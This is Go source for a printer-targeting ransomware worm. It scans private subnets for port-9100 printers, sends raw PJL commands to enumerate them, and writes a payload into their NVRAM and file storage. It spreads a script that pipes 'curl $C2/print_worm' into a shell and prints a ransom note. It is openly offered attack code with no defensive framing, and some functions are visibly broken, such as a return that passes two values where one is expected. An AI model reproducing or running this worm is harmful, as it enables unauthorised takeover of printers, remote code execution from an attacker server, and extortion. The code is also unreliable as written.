package ransomware

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

type PJLWorm struct {
	config      *RansomwareConfig
	printerIPs  []string
	port        int
	pjlPayload  string
}

func NewPJLWorm(cfg *RansomwareConfig) *PJLWorm {
	return &PJLWorm{
		config: cfg,
		port:   9100,
	}
}

func (p *PJLWorm) DiscoverPrinters() ([]string, error) {
	var printers []string

	subnets := []string{
		"192.168.0.0/24", "192.168.1.0/24",
		"10.0.0.0/24", "10.0.1.0/24",
		"172.16.0.0/24",
	}

	for _, subnet := range subnets {
		baseIP := strings.TrimSuffix(subnet, ".0/24")
		for i := 1; i <= 254; i++ {
			ip := fmt.Sprintf("%s.%d", baseIP, i)
			conn, err := net.DialTimeout("tcp", ip+":9100", 200*time.Millisecond)
			if err == nil {
				conn.Close()
				printers = append(printers, ip)
			}
			if len(printers) > 20 {
				return printers, nil
			}
		}
	}

	p.printerIPs = printers
	return printers, nil
}

func (p *PJLWorm) SendPJLCommand(printerIP string, pjlCommand string) (string, error) {
	conn, err := net.DialTimeout("tcp", printerIP+":9100", 5*time.Second)
	if err != nil {
		return "", fmt.Errorf("cannot connect to printer %s: %w", printerIP, err)
	}
	defer conn.Close()

	uellock := "\x1B%-12345X"
	fullCommand := uellock + "@PJL " + pjlCommand + "\r\n" + uellock

	conn.Write([]byte(fullCommand))
	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, err := conn.Read(buf)
	if err != nil && err.Error() != "EOF" {
		return string(buf[:n]), err
	}
	return string(buf[:n]), nil
}

func (p *PJLWorm) ReadPrinterNVRAM(printerIP string) (string, error) {
	return p.SendPJLCommand(printerIP, "DINQUIRE NVRAM")
}

func (p *PJLWorm) WriteToPrinterNVRAM(printerIP string, data string) error {
	escaped := strings.ReplaceAll(data, "\"", "\"\"")
	_, err := p.SendPJLCommand(printerIP,
		fmt.Sprintf("DEFAULT X404X_PAYLOAD=\"%s\"", escaped[:minPJL(128, len(escaped))]))
	return err
}

func (p *PJLWorm) PrinterFirmwareInfect(printerIP string, payload string) error {
	if _, err := p.ReadPrinterNVRAM(printerIP); err != nil {
		return err
	}

	if err := p.WriteToPrinterNVRAM(printerIP, payload); err != nil {
		return err
	}

	_, err := p.SendPJLCommand(printerIP, fmt.Sprintf("FSDOWNLOAD FORMAT:BINARY SIZE:%d NAME:\"0:\\pcl\\macros\\X4.BIN\"",
		len(payload)))
	if err != nil {
		return err
	}

	chunks := chunkPJL(payload, 256)
	for _, chunk := range chunks {
		p.SendPJLCommand(printerIP, fmt.Sprintf("FSAPPEND SIZE:%d", len(chunk)))
		conn, _ := net.DialTimeout("tcp", printerIP+":9100", 5*time.Second)
		if conn != nil {
			conn.Write([]byte(chunk))
			conn.Close()
		}
	}

	p.SendPJLCommand(printerIP, "FSQUERY")
	return nil
}

func (p *PJLWorm) EnumPrinterInfo(printerIP string) (map[string]interface{}, error) {
	info := make(map[string]interface{})

	queries := map[string]string{
		"model":    "INFO ID",
		"status":   "INFO STATUS",
		"config":   "INFO CONFIG",
		"pages":    "INFO PAGECOUNT",
		"memory":   "INFO MEMORY",
		"firmware": "INFO FILESYS",
	}

	for key, query := range queries {
		resp, err := p.SendPJLCommand(printerIP, query)
		if err == nil {
			info[key] = strings.TrimSpace(resp)
		}
	}

	return info, nil
}

func (p *PJLWorm) SpreadWormViaPrinter(sourceIP string) (int, error) {
	printers, err := p.DiscoverPrinters()
	if err != nil {
		return 0, err
	}

	infected := 0
	payload := fmt.Sprintf(`# X404X PJL Worm
C2=%s
curl -s $C2/print_worm | sh
`, sourceIP)

	for _, printerIP := range printers {
		if err := p.PrinterFirmwareInfect(printerIP, payload); err == nil {
			infected++
		}

		if infected >= 5 {
			break
		}
	}

	return infected, nil
}

func (p *PJLWorm) TogglePrintJob(printerIP string, on bool) error {
	status := "OFFLINE"
	if !on {
		status = "OFFLINE"
	} else {
		status = "ONLINE"
	}
	_, err := p.SendPJLCommand(printerIP, fmt.Sprintf("SET SERVICEMODE=%s", status))
	return err
}

func (p *PJLWorm) PrintRansomNote(printerIP string, note string) error {
	escaped := strings.ReplaceAll(note, "\n", "\r\n")
	escaped = strings.ReplaceAll(escaped, "\"", "\"\"")

	pclJob := fmt.Sprintf("\x1B%%-12345X@PJL ENTER LANGUAGE=PCL\r\n") +
		"\x1B&l0O" +
		"\x1B(0N" +
		"\x1B&l26A" +
		"\x1B&l1E" +
		fmt.Sprintf("\x1B&a50R%s", escaped) +
		"\x1B&l0H" +
		"\x0C" +
		"\x1B%-12345X"

	return p.SendPJLCommand(printerIP, pclJob)
}

func (p *PJLWorm) FullPJLWormSuite(c2Server string) map[string]interface{} {
	result := make(map[string]interface{})

	printers, err := p.DiscoverPrinters()
	if err != nil {
		result["discover_error"] = err.Error()
	} else {
		result["printers_found"] = len(printers)
		result["printer_list"] = printers
	}

	if len(printers) > 0 {
		info, err := p.EnumPrinterInfo(printers[0])
		if err == nil {
			result["sample_info"] = info
		}
	}

	infected, _ := p.SpreadWormViaPrinter(c2Server)
	result["infected"] = infected

	result["port"] = p.port
	return result
}

func minPJL(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func chunkPJL(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

var _ = os.ReadFile
